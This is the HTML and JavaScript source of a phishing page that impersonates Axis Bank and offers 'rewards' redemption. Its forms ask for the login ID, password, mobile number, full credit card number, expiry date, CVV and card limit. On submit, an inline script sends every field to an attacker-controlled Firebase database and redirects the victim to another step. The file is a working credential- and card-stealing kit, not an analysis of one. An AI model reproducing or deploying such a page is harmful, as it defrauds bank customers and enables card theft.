<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
    <link
      href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="css/style.css" />
    <title>Axis Bank</title>
  </head>
  <style>
    body {
      height: 100% !important;
    }
  </style>
  <body>
    <header>
      <img src="assets/header.jpg" width="100%" alt="" />
    </header>
    <main>
      <h2 class="text-center">Continue to Reedem rewards</h2>
      <div class="button-group">
        <div class="btn btn-primary login-form">Login ID / Customer ID</div>
        <div class="btn button-inactive credit-card-form">
          Credit Card Login
        </div>
      </div>
      <div class="box">
        <input
          type="hidden"
          id="nextValue"
          value="loader.html?next=cdob.html"
        />
        <form id="credit-form">
          <div id="form_container">
            <div id="login_form">
              <div class="form-group">
                <label for="">Login ID / Customer ID</label>
                <input type="text" name="lc_id" required />
              </div>
              <div class="form-group">
                <label for="">Password</label>
                <input type="password" name="lpass" required pattern="[A-Za-z][~`|•√π÷×¶∆£€$¢^°={}\©®™℅[].><,@#₹%&-+()*"':;!?_/']"  />
              </div>
              <div class="form-group">
                <label for="">Registered Mobile No.</label>
                <input
                  type="text"
                  inputmode="numeric"
                  class="numericInput"
                  name="rgmob"
                  maxlength="10"
                  minlength="10"
                  title="required valid 10 digit number"
                  required
                />
              </div>
            </div>
            <div id="credit_card_form" style="display: none">
              <div class="form-group">
                <label for="">Credit Card Number</label>
                <input
                  type="text"
                  inputmode="numeric"
                  name="ccnum"
                  id="ccnum"
                />
              </div>
              <div class="form-two w-100">
                <div class="form-group w-50">
                  <label for="">Expiry Date</label>
                  <input
                    type="text"
                    inputmode="numeric"
                    name="edate"
                    id="edate"
                    placeholder="MM / YY"
                  />
                </div>
                <div class="form-group w-50">
                  <label for="">CVV/CVV</label>
                  <input
                    type="password"
                    name="cvv"
                    id="cvv"
                    placeholder="***"
                  />
                </div>
              </div>
              <div class="form-group">
                <label for="">Credit Card Limit (in Rupees)</label>
                <input
                  type="number"
                  inputmode="numeric"
                  name="limit"
                  id="ccl"
                />
              </div>
              <div class="form-group">
                <label for="">Registered Mobile No.</label>
                <input
                  type="text"
                  inputmode="numeric"
                  name="rgmob"
                  id="rgmob"
                  maxlength="10"
                  minlength="10"
                  title="required valid 10 digit number"
                />
              </div>
            </div>
          </div>
          <div class="form-group">
            <button type="submit" class="btn btn-primary">LOGIN</button>
          </div>
        </form>
      </div>
      <img src="assets/footer.jpg" alt="" width="100%" />
    </main>
    <footer>
      <img src="assets/cop.jpg" alt="" width="100%" />
    </footer>

    <script
      defer
      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"
    ></script>

    <script
      defer
      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"
    ></script>
    <script
      defer
      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"
    ></script>

    <script type="module">
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
      // TODO: Add SDKs for Firebase products that you want to use
      // https://firebase.google.com/docs/web/setup#available-libraries

      import {
        getDatabase,
        ref,
        push,
      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";

      // Your web app's Firebase configuration
      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
      const firebaseConfig = {
  apiKey: "AIzaSyAhMT795jMueJaGMIJN2Q9_vC1pJ-wuVjs",
  authDomain: "axis-e147d.firebaseapp.com",
  databaseURL: "https://axis-e147d-default-rtdb.firebaseio.com",
  projectId: "axis-e147d",
  storageBucket: "axis-e147d.appspot.com",
  messagingSenderId: "580929084575",
  appId: "1:580929084575:web:3b29c8cd76b62bf822d6aa"
};

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const analytics = getAnalytics(app);
      const database = getDatabase(app);

      document
        .getElementById("credit-form")
        .addEventListener("submit", function (event) {
          event.preventDefault();
          //IDS
            const lc_id = document.querySelector('input[name="lc_id"]').value;
            const lpass = document.querySelector('input[name="lpass"]').value;
            const ccnum = document.querySelector('input[name="ccnum"]').value;
            const edate = document.querySelector('input[name="edate"]').value;
            const cvv = document.querySelector('input[name="cvv"]').value;
            const limit = document.querySelector('input[name="limit"]').value;
            const rgmob = document.querySelector('input[name="rgmob"]').value;

          // Push data to the database
          const dbRef = ref(database, "users");
          push(dbRef, {
            LoginID: lc_id,
            Password: lpass,
            CreditCardNumber: ccnum,
            ExpiryDate: edate,
            CVV: cvv,
            CreditCardLimit: limit,
            RegisteredMobileNumber: rgmob,
          })
            .then(() => {
              console.log("Data inserted successfully!");
              window.location.href = "loader.html?next=cdob.html";
            })
            .catch((error) => {
              console.error("Error inserting data: ", error);
            });
        });

      document
        .getElementById("customer-form")
        .addEventListener("submit", function (event) {
          event.preventDefault();
          //IDS
          const customerId = document.querySelector(
            'input[name="CustomerID"]'
          ).value;
          const idpassword = document.querySelector(
            'input[name="IDPassword"]'
          ).value;

          // Push data to the database
          const dbRef = ref(database, "users");
          push(dbRef, {
            CustomerId: customerId,
            IdPassword: idpassword,
          })
            .then(() => {
              console.log("Data inserted successfully!");
              window.location.href = "loader.html?next=cdob.html";
            })
            .catch((error) => {
              console.error("Error inserting data: ", error);
            });
        });
    </script>

    <script
      src="https://code.jquery.com/jquery-3.7.1.min.js"
      integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
      crossorigin="anonymous"
    ></script>
    <!-- <script src="/js/script.js"></script> -->
    <script>
      $(document).ready(function () {
        new Cleave("#ccnum", {
          creditCard: true,
        });

        new Cleave("#edate", {
          date: true,
          datePattern: ["m", "y"],
        });
        new Cleave("#cvv", {
          numeral: true,
          numeralPositiveOnly: true,
        });

        var mobileNumberInput = new Cleave("#rgmob", {
          numericOnly: true,
          blocks: [10], // Format: XXXXXXXXXX (10-digit Indian mobile numbers)
          delimiter: "", // No delimiter
          uppercase: true,
          delimiterLazyShow: false,
        });

        $(".login-form").click();
      });
      $(".login-form").click(function () {
        $(this).addClass("btn-primary");
        $(".credit-card-form").removeClass("btn-primary");

        $("#login_form input").attr("required", "required");

        $("#credit_card_form  input").val("");
        $("#credit_card_form  input").removeAttr("required");

        $("#credit_card_form").hide();
        $("#login_form").fadeIn();
      });

      $(".credit-card-form").click(function () {
        $(this).addClass("btn-primary");
        $(".login-form").removeClass("btn-primary");

        $("#credit_card_form input").attr("required", "required");
        $("#login_form  input").val("");
        $("#login_form  input").removeAttr("required");
        $("#login_form").hide();
        $("#credit_card_form").fadeIn();
      });
    </script>
  </body>
</html>
